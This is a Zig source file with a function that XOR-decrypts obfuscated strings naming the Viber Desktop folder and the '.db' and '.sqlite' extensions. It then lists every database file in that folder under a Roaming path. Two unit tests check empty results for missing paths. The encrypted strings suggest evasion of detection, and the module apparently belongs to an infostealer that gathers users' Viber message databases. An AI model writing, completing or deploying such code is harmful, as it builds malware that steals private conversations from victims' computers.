const std = @import("std");
const hash = @import("../types/hash.zig");

const E = struct {
    const VIBERPC = hash.xorEncrypt("ViberPC");
    const DB_EXT = hash.xorEncrypt(".db");
    const SQLITE_EXT = hash.xorEncrypt(".sqlite");
};

pub fn collect(allocator: std.mem.Allocator, roaming: []const u8) ![][]const u8 {
    var files = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (files.items) |f| allocator.free(f);
        files.deinit();
    }

    var viber_buf: [E.VIBERPC.len]u8 = undefined;
    var db_ext_buf: [E.DB_EXT.len]u8 = undefined;
    var sqlite_ext_buf: [E.SQLITE_EXT.len]u8 = undefined;
    hash.xorDecrypt(&E.VIBERPC, &viber_buf);
    hash.xorDecrypt(&E.DB_EXT, &db_ext_buf);
    hash.xorDecrypt(&E.SQLITE_EXT, &sqlite_ext_buf);

    const base_path = try std.fs.path.join(allocator, &[_][]const u8{ roaming, viber_buf[0..] });
    defer allocator.free(base_path);

    var dir = std.fs.openDirAbsolute(base_path, .{ .iterate = true }) catch return try allocator.alloc([]const u8, 0);
    defer dir.close();

    var iter = dir.iterate();
    while (iter.next() catch {}) |entry| {
        if (entry.kind != .file) continue;
        const name = entry.name;
        if (!std.mem.endsWith(u8, name, db_ext_buf[0..]) and !std.mem.endsWith(u8, name, sqlite_ext_buf[0..])) continue;
        const full = try std.fs.path.join(allocator, &[_][]const u8{ base_path, name });
        try files.append(full);
    }

    return files.toOwnedSlice();
}

test "collect returns empty for nonexistent path" {
    const result = try collect(std.testing.allocator, "C:\\__nonexistent__viber");
    defer {
        for (result) |f| std.testing.allocator.free(f);
        std.testing.allocator.free(result);
    }
    try std.testing.expectEqual(@as(usize, 0), result.len);
}

test "collect returns empty for empty dir" {
    const result = try collect(std.testing.allocator, "C:\\__nonexistent__viber_empty");
    defer {
        for (result) |f| std.testing.allocator.free(f);
        std.testing.allocator.free(result);
    }
    try std.testing.expectEqual(@as(usize, 0), result.len);
}
